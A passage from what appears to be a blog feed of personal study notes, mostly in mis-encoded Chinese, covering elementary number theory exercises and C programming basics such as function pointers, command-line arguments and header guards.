9.</p><pre><code>n = a*10^3+b*10^2+c*10+d (mod 9)= a*1 + b*1 + c*1 + d (mod 9)= a+b+c+d (mod 9)</code></pre><h1 id="Euclidean-Algorithm-1"><a href="#Euclidean-Algorithm-1" class="headerlink" title="Euclidean Algorithm"></a>Euclidean Algorithm</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-21-00.png" alt></p><h1 id="Proof-multiples-of-k-between-n-and-m-inclusive-ï¼ˆ-ï¼‰"><a href="#Proof-multiples-of-k-between-n-and-m-inclusive-ï¼ˆ-ï¼‰" class="headerlink" title="Proof multiples of k between n and m (inclusive)ï¼ˆ??ï¼‰"></a>Proof multiples of k between n and m (inclusive)ï¼ˆ??ï¼‰</h1><p><a href="https://edstem.org/au/courses/19133/discussion/2218972">https://edstem.org/au/courses/19133/discussion/2218972</a></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-21-30.png" alt></p><p>è¿™ä¸ªé¢˜æˆ‘åšåˆ°</p><script type="math/tex; mode=display">q=\left\lfloor \frac{m}{k} \right\rfloor - \left\lceil \frac{n}{k} \right\rceil +1</script><p>ä½†æ˜¯å’Œä¸Šå›¾çš„è¿™ä¸ªç­”æ¡ˆè¿˜æ˜¯ä¸å¤ªä¸€æ ·ï¼Œæ­¤æ—¶æˆ‘æœ‰é—®é¢˜ï¼ŒED forumä¸Šé—®äº†ä¸‹ã€‚</p><p>ï¼ˆä¸æ”¾æˆ‘è‡ªå·±çš„è¯¦ç»†ç¬”è®°äº†ï¼Œå‚è€ƒä¸‹å›¾tutorçš„è§£æ³•ï¼‰</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-23-53.png" alt></p><p>å¥½äººä¹‹è¯æ˜ï¼š</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-24-07.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-24-43.png" alt></p><h1 id="gcd-m-n-lcm-m-n-m-n"><a href="#gcd-m-n-lcm-m-n-m-n" class="headerlink" title="gcd(m,n)lcm(m,n)=|m||n|"></a>gcd(m,n)<em>lcm(m,n)=|m|</em>|n|</h1><p>å…³é”®ç‚¹ï¼š</p><p>å¯ä»¥æŠŠä»»ä½•æ•°å­—ï¼Œæ‹†åˆ†æˆNä¸ªç´ æ•°çš„å¹‚çš„ä¹˜ç§¯<br>æ¯”å¦‚13æ˜¯  $13=2 \times 5^0 \times 7^0 \times 11^0 \times 13$</p><p>æé†’ä¸‹ï¼Œç´ æ•°æ˜¯ä»2å¼€å§‹çš„ï¼Œæœ€å°çš„ç´ æ•°æ˜¯2</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-05.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-18.png" alt></p><h1 id="For-m-n-âˆˆ-Z-if-m-gt-n-then-gcd-m-n-gcd-mâˆ’n-n"><a href="#For-m-n-âˆˆ-Z-if-m-gt-n-then-gcd-m-n-gcd-mâˆ’n-n" class="headerlink" title="For m,n âˆˆ Z, if m &gt; n then gcd(m,n) = gcd(mâˆ’n,n)"></a>For m,n âˆˆ Z, if m &gt; n then gcd(m,n) = gcd(mâˆ’n,n)</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-27-43.png" alt></p><h1 id="How-many-numbers-between-1-and-653-are-divisible-by-3-or-5"><a href="#How-many-numbers-between-1-and-653-are-divisible-by-3-or-5" class="headerlink" title="How many numbers between 1 and 653 are divisible by 3 or 5?"></a>How many numbers between 1 and 653 are divisible by 3 or 5?</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-28-11.png" alt></p><pre><code>1.    ç®—[1,653]ä¸­3çš„å€æ•°çš„ä¸ªæ•°æœ€å°æ˜¯3ï¼Œæœ€å¤§æ˜¯651ï¼ŒN(3)=(651-3)/3 + 1 = 2172.    ç®—5çš„å€æ•°the smallest is 5, and the largest # is 650So N(5)=(650-5)/5 + 1 = 1303.    find the # of the multiples of 15The smallest is 15, and the largest # is 645So N(15)=(645-15)/15 + 1 = 43So we calcute N(3) + N(5) â€“ N(15) = 217+130-43 = 304</code></pre><h1 id="Suppose-that-n-is-a-positive-integer-Explain-why-n-and-n-1-are-coprime"><a href="#Suppose-that-n-is-a-positive-integer-Explain-why-n-and-n-1-are-coprime" class="headerlink" title="Suppose that n is a positive integer. Explain why n and n + 1 are coprime."></a>Suppose that n is a positive integer. Explain why n and n + 1 are coprime.</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-28-47.png" alt></p><h1 id="Find-the-last-two-digits-of-7-7-7"><a href="#Find-the-last-two-digits-of-7-7-7" class="headerlink" title="Find the last two digits of $7^{7^{7}}$"></a>Find the last two digits of $7^{7^{7}}$</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-29-22.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-29-32.png" alt></p><p>$7^7$ -(4*205885)=3</p><p>so it is 43.</p><h1 id="Find-the-least-positive-integer-n-for-which-5n-17-16-Hence-evaluate-5200-17"><a href="#Find-the-least-positive-integer-n-for-which-5n-17-16-Hence-evaluate-5200-17" class="headerlink" title="Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17."></a>Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17.</h1><p>å·§å¦™ä¹‹å¤„åœ¨äºï¼Œè€ƒè™‘åˆ°%17æ—¶ï¼Œ16=-1ï¼Œæ‰€ä»¥-1çš„å¹³æ–¹å°±æ˜¯1ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¾ªç¯ã€‚</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-30-49.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>basic</title>
      <link href="/2024/09/10/Cpp/basic/"/>
      <url>/2024/09/10/Cpp/basic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡">ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡</a></li><li><a href="#typedefå®šä¹‰æ–°ç±»å‹">Typedef:å®šä¹‰æ–°ç±»å‹</a></li><li><a href="#å‡½æ•°æŒ‡é’ˆ">å‡½æ•°æŒ‡é’ˆ</a><ul><li><a href="#ä½¿ç”¨åœºæ™¯">ä½¿ç”¨åœºæ™¯</a><ul><li><a href="#1å›è°ƒå‡½æ•°-callback-functions">1.å›è°ƒå‡½æ•° (Callback Functions)</a></li><li><a href="#2å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨">2.å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨</a></li></ul></li></ul></li><li><a href="#ä¼ é€’å‘½ä»¤è¡Œå‚æ•°å‚æ•°æ•°é‡-å‚æ•°å€¼-ç¯å¢ƒå˜é‡å€¼">ä¼ é€’å‘½ä»¤è¡Œå‚æ•°:å‚æ•°æ•°é‡ å‚æ•°å€¼ ç¯å¢ƒå˜é‡å€¼</a><ul><li><a href="#å‚æ•°æ•°é‡-å‚æ•°å€¼">å‚æ•°æ•°é‡ å‚æ•°å€¼</a></li><li><a href="#ç¯å¢ƒå˜é‡å€¼">ç¯å¢ƒå˜é‡å€¼</a></li></ul></li></ul><h1 id="ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡"><a href="#ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡" class="headerlink" title="ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡"></a>ç»“æ„ä½“è®¿é—®æˆå‘˜å˜é‡</h1><p>å‡è®¾æœ‰ä¸€ä¸ªç»“æ„ä½“ struct Point å’Œä¸€ä¸ªæŒ‡å‘ Point çš„æŒ‡é’ˆï¼š</p><pre><code>struct Point &#123;    int x;    int y;&#125;;struct Point p = &#123;10, 20&#125;;struct Point *p_ptr = &amp;p;</code></pre><p>å¯ä»¥é€šè¿‡ -&gt; è¿ç®—ç¬¦è®¿é—®ç»“æ„ä½“ p çš„æˆå‘˜ x å’Œ yï¼Œå¦‚ä¸‹</p><pre><code>int x_val = p_ptr-&gt;x;  // ç­‰åŒäº (*p_ptr).xint y_val = p_ptr-&gt;y;</code></pre><p>ä¸ºä»€ä¹ˆä½¿ç”¨ <code>-&gt;</code></p><p>ç®€ä¾¿æ€§ï¼š-&gt; æ˜¯ (<em>p_ptr).x çš„ç®€å†™ï¼Œé¿å…äº†ä½¿ç”¨ </em> å’Œ () çš„ç¹çè¯­æ³•ã€‚</p><p>æŒ‡é’ˆè®¿é—®ï¼š-&gt; ç›´æ¥è¡¨ç¤ºå¯¹ç»“æ„ä½“æŒ‡é’ˆæˆå‘˜çš„è®¿é—®ï¼Œæ–¹ä¾¿ç†è§£ã€‚</p><h1 id="Typedef-å®šä¹‰æ–°ç±»å‹"><a href="#Typedef-å®šä¹‰æ–°ç±»å‹" class="headerlink" title="Typedef:å®šä¹‰æ–°ç±»å‹"></a>Typedef:å®šä¹‰æ–°ç±»å‹</h1><p>C allows us to define new data type (names) via typedef:</p><p>typedef <strong>ExistingDataType</strong> <strong>NewTypeName</strong>;</p><p>Examples:</p><pre><code>typedef float Temperature;typedef int Matrix[20][20];</code></pre><h1 id="å‡½æ•°æŒ‡é’ˆ"><a href="#å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="å‡½æ•°æŒ‡é’ˆ"></a>å‡½æ•°æŒ‡é’ˆ</h1><p>æˆ‘çš„ç†è§£ï¼Œå°±æ˜¯ typedef å®šä¹‰ä¸€ä¸ªåå­—ï¼Œå£°æ˜ å‚æ•°ã€è¿”å›å€¼ æ˜¯äº›å•¥ã€‚ç„¶åè¿™ä¸ªåå­—ï¼Œå½“ä½œç±»å‹å£°æ˜ï¼Œå¿«é€Ÿå¤åˆ¶å…¶ä»–åå­—çš„å‡½æ•°ã€‚</p><p>æ³¨æ„ï¼Œèµ‹å€¼ç»™å…¶ä»–æ–°å‡½æ•°åå­—çš„æ—¶å€™ï¼Œåé¢çš„å‡½æ•°åå­—åŠ ä¸åŠ &amp;éƒ½å¯ä»¥ï¼Œå› ä¸ºCä¼šå®é™…å°†å…¶å¤„ç†ä¸ºå‡½æ•°åœ°å€ã€‚</p><pre><code>// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;ComparatorFuncPtr fptr = &amp;IsLarger;  </code></pre><p>æˆ–å¦‚ï¼š</p><pre><code>typedef int (*ComparatorFuncPtr)(int, int);int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;ComparatorFuncPtr fptr1 = IsLarger;  // Implicit pointerComparatorFuncPtr fptr2 = &amp;IsLarger; // Explicit pointerint result1 = fptr1(5, 3);  // Calls IsLarger(5, 3)int result2 = fptr2(5, 3);  // Also calls IsLarger(5, 3)</code></pre><h2 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h2><h3 id="1-å›è°ƒå‡½æ•°-Callback-Functions"><a href="#1-å›è°ƒå‡½æ•°-Callback-Functions" class="headerlink" title="1.å›è°ƒå‡½æ•° (Callback Functions)"></a>1.å›è°ƒå‡½æ•° (Callback Functions)</h3><p>å‡½æ•°æŒ‡é’ˆå¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œé€šå¸¸ç”¨äºå›è°ƒæœºåˆ¶ã€‚åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæ¯”å¦‚æ’åºã€äº‹ä»¶é©±åŠ¨ç¨‹åºæˆ–è€…ä¿¡å·å¤„ç†ï¼Œä½ å¯ä»¥å°†ç‰¹å®šçš„å‡½æ•°é€šè¿‡å‡½æ•°æŒ‡é’ˆä¼ é€’ç»™åº“å‡½æ•°ï¼Œåº“å‡½æ•°åœ¨åˆé€‚çš„æ—¶æœºè°ƒç”¨ä½ ä¼ é€’çš„å‡½æ•°ã€‚</p><p>ç¤ºä¾‹ï¼šä½¿ç”¨å‡½æ•°æŒ‡é’ˆä½œä¸ºå›è°ƒå‡½æ•°</p><pre><code>#include &lt;stdio.h&gt;void callback(int result) &#123;    printf(&quot;Callback called with result: %d\n&quot;, result);&#125;void compute(int a, int b, void (*callbackFunc)(int)) &#123;    int sum = a + b;    callbackFunc(sum);  // è°ƒç”¨ä¼ å…¥çš„å›è°ƒå‡½æ•°&#125;int main() &#123;    compute(3, 4, callback);  // ä¼ å…¥ callback å‡½æ•°æŒ‡é’ˆ    return 0;&#125;</code></pre><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œcomputeå‡½æ•°æ¥æ”¶ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆå‚æ•° callbackFuncï¼Œç„¶ååœ¨åˆé€‚çš„æ—¶å€™è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p><h3 id="2-å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨"><a href="#2-å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨" class="headerlink" title="2.å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨"></a>2.å®ç°ç­–ç•¥æ¨¡å¼æˆ–åŠ¨æ€å‡½æ•°è°ƒç”¨</h3><p>å‡½æ•°æŒ‡é’ˆå¯ä»¥è®©ä½ åœ¨ç¨‹åºè¿è¡Œæ—¶é€‰æ‹©ä¸åŒçš„å‡½æ•°æ¥æ‰§è¡Œç›¸åŒçš„ä»»åŠ¡ã€‚è¿™åœ¨å®ç°ä¸åŒçš„ç­–ç•¥æˆ–è¡Œä¸ºæ—¶éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚ä¸åŒçš„æ’åºè§„åˆ™ã€æ¯”è¾ƒå‡½æ•°ã€æˆ–è€…åŠ¨æ€å¤„ç†ä¸åŒç±»å‹çš„æ•°æ®ã€‚<br>ç¤ºä¾‹ï¼šä¸åŒçš„æ¯”è¾ƒå‡½æ•°ä¼ é€’ç»™æ’åºç®—æ³•</p><pre><code>#include &lt;stdio.h&gt;// æ¯”è¾ƒå‡½æ•°int ascending(int a, int b) &#123;    return a - b;&#125;int descending(int a, int b) &#123;    return b - a;&#125;// ä½¿ç”¨å‡½æ•°æŒ‡é’ˆçš„é€šç”¨æ’åºå‡½æ•°void sort(int* arr, int size, int (*compare)(int, int)) &#123;    for (int i = 0; i &lt; size - 1; i++) &#123;        for (int j = i + 1; j &lt; size; j++) &#123;            if (compare(arr[i], arr[j]) &gt; 0) &#123;                int temp = arr[i];                arr[i] = arr[j];                arr[j] = temp;            &#125;        &#125;    &#125;&#125;int main() &#123;    int arr[] = &#123;5, 2, 9, 1, 5, 6&#125;;    int size = sizeof(arr) / sizeof(arr[0]);    sort(arr, size, ascending);  // ä½¿ç”¨å‡åºæ¯”è¾ƒ    for (int i = 0; i &lt; size; i++) &#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);    sort(arr, size, descending);  // ä½¿ç”¨é™åºæ¯”è¾ƒ    for (int i = 0; i &lt; size; i++) &#123;        printf(&quot;%d &quot;, arr[i]);    &#125;    printf(&quot;\n&quot;);    return 0;&#125;</code></pre><h1 id="ä¼ é€’å‘½ä»¤è¡Œå‚æ•°-å‚æ•°æ•°é‡-å‚æ•°å€¼-ç¯å¢ƒå˜é‡å€¼"><a href="#ä¼ é€’å‘½ä»¤è¡Œå‚æ•°-å‚æ•°æ•°é‡-å‚æ•°å€¼-ç¯å¢ƒå˜é‡å€¼" class="headerlink" title="ä¼ é€’å‘½ä»¤è¡Œå‚æ•°:å‚æ•°æ•°é‡ å‚æ•°å€¼ ç¯å¢ƒå˜é‡å€¼"></a>ä¼ é€’å‘½ä»¤è¡Œå‚æ•°:å‚æ•°æ•°é‡ å‚æ•°å€¼ ç¯å¢ƒå˜é‡å€¼</h1><p>é¦–å…ˆæ³¨æ„å•Šï¼Œargv å’Œ envéƒ½å­˜å‚¨çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœä½ è¾“å…¥å‚æ•°æ˜¯æ•°å­—ï¼Œéœ€è¦è½¬æ¢æˆæ•°å­—æ‰è¡Œ</p><h2 id="å‚æ•°æ•°é‡-å‚æ•°å€¼"><a href="#å‚æ•°æ•°é‡-å‚æ•°å€¼" class="headerlink" title="å‚æ•°æ•°é‡ å‚æ•°å€¼"></a>å‚æ•°æ•°é‡ å‚æ•°å€¼</h2><p>argc (Argument Count)</p><p>./my_program arg1 arg2 arg3</p><p>argc will be 4:<br><strong>argv[0]</strong> is the <strong>name of the program</strong> (â€œ./my_programâ€).</p><pre><code>argv[1] is &quot;arg1&quot;.argv[2] is &quot;arg2&quot;.argv[3] is &quot;arg3&quot;.</code></pre><p>argv (Argument Vector)</p><p><strong>char </strong>argv<strong> or </strong>char <em>argv[]*</em></p><p>è¿™æ˜¯ä¸ªå­˜å‚¨ char<em> çš„æ•°ç»„ï¼Œchar </em>æ˜¯å­—ç¬¦æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸åŒå­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦çš„åœ°å€ï¼‰</p><p>æ¯”å¦‚æˆ‘ä»¬ä¼ å‚ï¼Œ</p><pre><code>./exe aaa bbb</code></pre><p>ç¨‹åºä¸­ï¼Œ</p><pre><code>Char a[]=â€œaaaâ€Char b[]=â€œbbbâ€Char c[]=â€œcccâ€</code></pre><p>a,b,cåå­—æœ¬èº«å°±æ˜¯char<em>ï¼Œæˆ–è€…è¯´ï¼Œ<em>*é¦–åœ°å€</em></em></p><p>char <em>a = â€œhelloâ€; char </em>b = â€œworldâ€; char *c = â€œexampleâ€;</p><p>argv æ˜¯ä¸€ä¸ª<strong>æŒ‡é’ˆæ•°ç»„</strong>ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨å¤šä¸ª <strong>char*</strong> çš„æ•°ç»„ã€‚æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œargv çš„ç±»å‹æ˜¯ char<em>*ï¼Œè¡¨ç¤ºå®ƒæ˜¯â€œå­—ç¬¦æŒ‡é’ˆçš„æŒ‡é’ˆâ€ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ char</em>ï¼Œè¿™äº› char* æŒ‡å‘çš„æ˜¯å…·ä½“çš„å­—ç¬¦ä¸²ï¼ˆå³å­—ç¬¦æ•°ç»„ï¼‰ã€‚</p><pre><code>argv[0] is the name of the program (or the path used to execute it).argv[1] to argv[argc-1] are the actual arguments passed to the program.int main(int argc, char **argv, char **env)&#123;  Print(â€œargc = %d\nâ€, argc);  Print(â€œargv[0] = %d\nâ€, argv[0]);  Print(â€œargv[1] = %d\nâ€, argv[1]);  For (int I=0; i&lt;argc; i++)&#123;    Xxx  &#125;&#125;</code></pre><h2 id="ç¯å¢ƒå˜é‡å€¼"><a href="#ç¯å¢ƒå˜é‡å€¼" class="headerlink" title="ç¯å¢ƒå˜é‡å€¼"></a>ç¯å¢ƒå˜é‡å€¼</h2><p>char <em>*env æˆ– char </em>env[]</p><p>å½¢å¼åŒchar **agvï¼Œenvæ˜¯ç¼–è¯‘å™¨é»˜è®¤å®šä¹‰å¥½çš„æ•°ç»„</p><p>è¿™äº›å­—ç¬¦ä¸²æ˜¯ç¯å¢ƒå˜é‡çš„åç§°å’Œå€¼ï¼Œé€šå¸¸ä»¥ <strong>â€œNAME=VALUEâ€</strong></p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char **argv, char **env) &#123;    // éå†å¹¶æ‰“å°æ‰€æœ‰ç¯å¢ƒå˜é‡    for (int i = 0; env[i] != NULL; i++) &#123;        printf(&quot;%s\n&quot;, env[i]);    &#125;    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>header file</title>
      <link href="/2024/09/10/Cpp/header-file/"/>
      <url>/2024/09/10/Cpp/header-file/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#å¦‚ä½•å†™å¤´æ–‡ä»¶">å¦‚ä½•å†™å¤´æ–‡ä»¶</a></li><li><a href="#hå¤´æ–‡ä»¶externå…³é”®å­—">.hå¤´æ–‡ä»¶externå…³é”®å­—</a><ul><li><a href="#extern-çš„ä¸»è¦ä½œç”¨">extern çš„ä¸»è¦ä½œç”¨</a></li><li><a href="#åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°">åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°</a></li></ul></li><li><a href="#ifndef--é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«">#ifndef : é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«</a><ul><li><a href="#å·¥ä½œåŸç†">å·¥ä½œåŸç†</a></li><li><a href="#ç¤ºä¾‹">ç¤ºä¾‹</a></li></ul></li></ul><h1 id="å¦‚ä½•å†™å¤´æ–‡ä»¶"><a href="#å¦‚ä½•å†™å¤´æ–‡ä»¶" class="headerlink" title="å¦‚ä½•å†™å¤´æ–‡ä»¶"></a>å¦‚ä½•å†™å¤´æ–‡ä»¶</h1><p><code>.h</code> ä¸å†™å®ç°ï¼Œåªå†™å£°æ˜ï¼ŒåŒåçš„ <code>.c</code> å†™å®ç°ã€‚</p><p><code>.h</code>å¯ä»¥å®šä¹‰ç±»å‹ï¼Œç”šè‡³è‡ªå·±çš„.cæ–‡ä»¶åŒ…æ‹¬è‡ªå·±çš„<code>#include &quot;Graph.h&quot;</code>ï¼ˆå¿…é¡»ï¼ï¼‰æ¥è·å–è¿™ä¸ªç±»å‹ï¼Œ<code>.c</code>æ— é¡»è‡ªè¡Œå†å®šä¹‰ç±»å‹ã€‚</p><h1 id="hå¤´æ–‡ä»¶externå…³é”®å­—"><a href="#hå¤´æ–‡ä»¶externå…³é”®å­—" class="headerlink" title=".hå¤´æ–‡ä»¶externå…³é”®å­—"></a>.hå¤´æ–‡ä»¶externå…³é”®å­—</h1><p>åœ¨ C è¯­è¨€ä¸­ï¼Œextern å…³é”®å­—ç”¨äºå£°æ˜ä¸€ä¸ªå˜é‡æˆ–å‡½æ•°æ˜¯åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„ï¼Œä»è€Œåœ¨å¤šä¸ªæ–‡ä»¶é—´å…±äº«æ•°æ®æˆ–å‡½æ•°ã€‚è¿™ç§æœºåˆ¶åœ¨å¤§å‹é¡¹ç›®ä¸­éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥é¿å…é‡å¤å®šä¹‰ï¼Œæå‡ä»£ç çš„ç»„ç»‡æ€§ã€‚</p><h2 id="extern-çš„ä¸»è¦ä½œç”¨"><a href="#extern-çš„ä¸»è¦ä½œç”¨" class="headerlink" title="extern çš„ä¸»è¦ä½œç”¨"></a>extern çš„ä¸»è¦ä½œç”¨</h2><ol><li><p>å£°æ˜å¤–éƒ¨å˜é‡ï¼šé€šè¿‡ <code>extern</code> å£°æ˜å˜é‡æ—¶ï¼Œ<strong>å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡åœ¨å…¶ä»–æ–‡ä»¶ä¸­å·²ç»å®šä¹‰ï¼Œå½“å‰æ–‡ä»¶åªæ˜¯å¼•ç”¨å®ƒ</strong>ã€‚</p></li><li><p>å¤–éƒ¨å‡½æ•°çš„å£°æ˜ï¼šå¦‚æœä¸€ä¸ªå‡½æ•°åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®ç°ï¼Œè€Œå½“å‰æ–‡ä»¶æƒ³è¦è°ƒç”¨å®ƒï¼Œå¯ä»¥é€šè¿‡ <code>extern</code> è¿›è¡Œå£°æ˜ï¼Œè™½ç„¶é€šå¸¸åœ¨å¤´æ–‡ä»¶ä¸­å£°æ˜å‡½æ•°æ—¶ä¼šçœç•¥ <code>extern</code> å…³é”®å­—ã€‚</p></li></ol><p>æ³¨æ„äº‹é¡¹ï¼šä»…ç”¨äºå£°æ˜ï¼šextern åªèƒ½å£°æ˜å˜é‡æˆ–å‡½æ•°ï¼Œä¸èƒ½ç”¨äºå®šä¹‰ã€‚å®šä¹‰æ—¶ä¸éœ€è¦ externã€‚</p><p>é»˜è®¤ä½œç”¨åŸŸï¼šå¦‚æœä¸€ä¸ªå˜é‡åœ¨ .c æ–‡ä»¶ä¸­<strong>ä¸å¸¦ extern å…³é”®å­—</strong>ç›´æ¥å£°æ˜ï¼Œé‚£ä¹ˆå®ƒåœ¨æ•´ä¸ªæ–‡ä»¶ä¸­æœ‰æ•ˆï¼Œä½†ä¸å¯¹å…¶ä»–æ–‡ä»¶å¯è§ã€‚</p><h2 id="åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°"><a href="#åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°" class="headerlink" title="åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°"></a>åªå£°æ˜å˜é‡ä¸å£°æ˜å‡½æ•°</h2><p>extern å®é™…ä¸Šå¯ä»¥ç”¨äºå£°æ˜å‡½æ•°ï¼Œä¸è¿‡å®ƒåœ¨å‡½æ•°å£°æ˜ä¸­é€šå¸¸æ˜¯å¯é€‰çš„ã€‚å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œå‡½æ•°å£°æ˜å·²ç»å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ï¼Œextern å…³é”®å­—å¯¹å‡½æ•°å£°æ˜æ²¡æœ‰é¢å¤–ä½œç”¨ã€‚</p><p>// å£°æ˜åœ¨å…¶ä»–æ–‡ä»¶å®šä¹‰çš„å˜é‡</p><pre><code>extern int myVariable;</code></pre><p>// ä¸‹é¢ä¸¤ç§å†™æ³•ç­‰ä»·ï¼Œéƒ½æ˜¯å£°æ˜å‡½æ•°åœ¨å…¶ä»–åœ°æ–¹å®šä¹‰</p><pre><code>extern void myFunction();void myFunction();  // ç­‰ä»·äºä¸Šé¢çš„å£°æ˜</code></pre><h1 id="ifndef-é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«"><a href="#ifndef-é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«" class="headerlink" title="#ifndef : é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«"></a>#ifndef : é¿å…å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«</h1><p><strong>if not defined</strong>ï¼ˆâ€œå¦‚æœæ²¡æœ‰å®šä¹‰â€ï¼‰</p><p><code>#ifndef</code> æ˜¯ä¸€ä¸ªé¢„å¤„ç†æŒ‡ä»¤ï¼Œç”¨äºæ¡ä»¶ç¼–è¯‘ã€‚å®ƒçš„ä¸»è¦ç”¨é€”æ˜¯é˜²æ­¢å¤´æ–‡ä»¶è¢«å¤šæ¬¡åŒ…å«ã€‚é€šå¸¸ï¼Œå®ƒä¸ <code>#define</code> å’Œ <code>#endif</code> ä¸€èµ·ä½¿ç”¨ï¼Œä»¥<strong>ç¡®ä¿ä¸€ä¸ªæ–‡ä»¶åªä¼šè¢«åŒ…å«ä¸€æ¬¡ã€‚è¿™æ ·å¯ä»¥é¿å…ç”±äºé‡å¤åŒ…å«åŒä¸€æ–‡ä»¶è€Œå¯¼è‡´çš„ç¼–è¯‘é”™è¯¯</strong>ã€‚</p><p>ä¾‹å­ï¼š</p><pre><code>#ifndef EXAMPLE_H#define EXAMPLE_H// è¿™é‡Œæ˜¯å¤´æ–‡ä»¶çš„å†…å®¹void myFunction();#endif // EXAMPLE_H</code></pre><h2 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h2><ul><li><p>å½“ç¼–è¯‘å™¨ç¬¬ä¸€æ¬¡é‡åˆ° #ifndef EXAMPLE_H æ—¶ï¼Œç”±äº EXAMPLE_H å°šæœªå®šä¹‰ï¼Œå®ƒå°†ç»§ç»­ç¼–è¯‘å¹¶å®šä¹‰ EXAMPLE_Hã€‚</p></li><li><p>å¦‚æœè¯¥å¤´æ–‡ä»¶è¢«åç»­å…¶ä»–æ–‡ä»¶å†æ¬¡åŒ…å«ï¼Œ#ifndef ä¼šå‘ç° EXAMPLE_H å·²ç»å®šä¹‰ï¼Œç¼–è¯‘å™¨å°†è·³è¿‡è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œä»è€Œé¿å…é‡å¤å®šä¹‰ã€‚</p></li></ul><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>å¦‚<code>graph.h</code>ç›´æ¥å®šä¹‰æˆ<code>GRAPH_H</code>å³å¯ï¼Œä¸éœ€è¦çœŸèµ‹å€¼ã€‚</p><p>å¤´æ–‡ä»¶ä¿æŠ¤çš„å®Œæ•´ç¤ºä¾‹ï¼š</p><pre><code>#ifndef GRAPH_H#define GRAPH_H# define GRAPH_H 